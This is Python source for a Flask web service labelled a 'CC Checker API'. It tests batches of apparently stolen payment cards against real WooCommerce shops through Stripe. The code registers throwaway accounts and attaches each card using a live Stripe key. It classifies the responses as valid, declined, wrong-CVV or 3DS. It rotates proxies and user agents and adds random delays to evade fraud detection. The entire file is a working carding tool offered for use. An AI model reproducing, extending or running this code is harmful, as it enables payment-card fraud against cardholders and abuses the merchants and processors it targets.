import base64
import httpx
import random
import time
import json
import asyncio
from fake_useragent import UserAgent
import uuid
import re
from flask import Flask, request, jsonify
import os
from urllib.parse import unquote

app = Flask(__name__)

def load_proxies(path="proxies.txt"):
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# ---------------------------
# MAIN CARD HANDLER
# ---------------------------
async def create_payment_method(fullz, session, proxy_url=None):
    result = {
        "cc": fullz,
        "status": "unknown",
        "message": "",
        "proxy_used": proxy_url,
        "register_nonce": "",
        "setup_nonce": ""
    }
    
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = f"{user}@gmail.com"

        # --- minimal, realistic headers (mobile UA rotation) ---
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": UserAgent().random,  # mobile/desktop rotation
        }

        # STEP 1: get nonce
        response = await session.get(
            "https://siliconmingle.com/my-account/", headers=headers
        )
        register_nonce = gets(
            response.text,
            'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
            '" />',
        )
        result["register_nonce"] = register_nonce
        print("✅ register_nonce:", register_nonce)

        # STEP 2: register user
        data = {
            "email": mail,
            "woocommerce-register-nonce": register_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        await session.post(
            "https://www.tsclabelprinters.co.nz/my-account/",
            headers=headers,
            data=data,
        )

        # STEP 3: go to add-payment page
        response = await session.get(
            "https://www.tsclabelprinters.co.nz/my-account/add-payment-method/",
            headers=headers,
        )
        setup_nonce = gets(
            response.text, '"createAndConfirmSetupIntentNonce":"', '","'
        )
        result["setup_nonce"] = setup_nonce
        print("✅ setup_nonce:", setup_nonce)

        # STEP 4: Stripe create payment method
        data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "billing_details[address][country]": "PK",
            "key": "pk_live_51QAJmHEXW5JgQdqNSKW7jnzEuBeLz1iWmqIt2rGL3MW3CkCGXBpM3iTo2FgEVZ0LhKOBgbtEVemYX7vdlzoQWzyh00guIul597",
        }

        resp = await session.post(
            "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
        )

        try:
            pm_id = resp.json().get("id")
        except Exception:
            result["status"] = "error"
            result["message"] = f"Failed to create Stripe PM: {resp.text}"
            print("Failed to create Stripe PM:", resp.text)
            return result

        # STEP 5: attach in Woo
        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_nonce,
        }
        final = await session.post(
            "https://www.tsclabelprinters.co.nz/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=data,
        )

        # --- RESPONSE HANDLING (from friend's code) ---
        try:
            response_data = final.json()
            status = response_data.get("data", {}).get("status")
            error_message = response_data.get("data", {}).get("error", {}).get("message")

            if response_data.get("success") and status == "succeeded":
                result["status"] = "success"
                result["message"] = "CCN ADDED SUCCESSFULLY"
                print(f"✅ 𝗥𝗘𝗦𝗨𝗟𝗧 → CCN ADDED SUCCESSFULLY: {fullz}")
            elif status == "requires_action":
                result["status"] = "success_3ds"
                result["message"] = "CCN ADDED SUCCESSFULLY (3DS/OTP)"
                print(f"⚠️  𝗥𝗘𝗦𝗨𝗟𝗧 → CCN ADDED SUCCESSFULLY (3DS/OTP): {fullz}")
            elif error_message == "Your card's security code is incorrect.":
                result["status"] = "invalid_cvv"
                result["message"] = "INVALID CVV --> CCN"
                print(f"✅ 𝗥𝗘𝗦𝗨𝗟𝗧 → INVALID CVV --> CCN: {fullz}")
            elif error_message == "Your card was declined.":
                result["status"] = "declined"
                result["message"] = "Card Declined"
                print(f"❌ 𝗥𝗘𝗦𝗨𝗟𝗧 → Card Declined: {fullz}")
            elif error_message == "Your card does not support this type of purchase.":
                result["status"] = "not_supported"
                result["message"] = "Your card does not support this type of purchase"
                print(f"⚠️  𝗥𝗘𝗦𝗨𝗟𝗧 → Your card does not support this type of purchase: {fullz}")
            elif error_message == "card_error":
                result["status"] = "card_error"
                result["message"] = "Card type not Supported"
                print(f"⚠️  𝗥𝗘𝗦𝗨𝗟𝗧 → Card type not Supported: {fullz}")
            else:
                result["status"] = "unknown"
                result["message"] = str(response_data)
                print(response_data)
        except Exception as e:
            result["status"] = "error"
            result["message"] = final.text
            print(final.text)

        if proxy_url:
            print(f"Proxy used: {proxy_url}")

    except Exception as e:
        result["status"] = "error"
        result["message"] = str(e)
        print("Error:", e)
    
    return result


# ---------------------------
# GET PROXY IP (debug helper)
# ---------------------------
async def get_proxy_ip(session):
    try:
        resp = await session.get("https://api.ipify.org?format=json", timeout=10)
        return resp.json().get("ip")
    except Exception as e:
        return f"IP check failed: {e}"


# ---------------------------
# API ENDPOINTS
# ---------------------------
@app.route('/ccngate/<path:cc_data>', methods=['GET'])
def check_cc(cc_data):
    try:
        # Decode URL-encoded characters
        cc_data = unquote(cc_data)
        
        # Parse single or multiple CCs
        cc_list = cc_data.split(',')
        results = []
        
        # Load proxies
        proxies = load_proxies("proxies.txt")
        if not proxies:
            return jsonify({"error": "No proxies available"}), 500
        
        PROXY_ROTATE_EVERY = 5
        session = None
        proxy_url = None
        
        # Run async function in sync context
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            results = loop.run_until_complete(process_cc_list(cc_list, proxies))
        finally:
            loop.close()
        
        return jsonify({
            "total_checked": len(cc_list),
            "results": results
        })
    
    except Exception as e:
        print(f"Error in check_cc: {str(e)}")
        return jsonify({"error": str(e)}), 500

async def process_cc_list(cc_list, proxies):
    results = []
    PROXY_ROTATE_EVERY = 5
    session = None
    proxy_url = None
    
    try:
        for i, fullz in enumerate(cc_list):
            # Rotate proxy every N CCs
            if i % PROXY_ROTATE_EVERY == 0:
                if session:
                    await session.aclose()
                proxy_line = proxies[(i // PROXY_ROTATE_EVERY) % len(proxies)]
                host, port, user, pwd = proxy_line.split(":")
                if "session-RANDOMID" in user:
                    user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                session = httpx.AsyncClient(
                    proxies=proxy_url,
                    timeout=httpx.Timeout(60.0),
                    trust_env=False,
                    follow_redirects=True,
                )
                ip_used = await get_proxy_ip(session)
                print(f"\n🔗 New proxy: {proxy_url} | IP: {ip_used}")
            
            print(f"🔄 [{i+1}/{len(cc_list)}] Checking {fullz}")
            result = await create_payment_method(fullz, session, proxy_url)
            results.append(result)
            
            # Random delay to mimic human
            await asyncio.sleep(random.uniform(1.5, 3.5))
    
    finally:
        if session:
            await session.aclose()
    
    return results

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "message": "CC Checker API",
        "usage": {
            "single_cc": "/ccngate/4400667077773319|11|2028|823",
            "multiple_cc": "/ccngate/4400667077773319|11|2028|823,4400667077773320|12|2029|824"
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
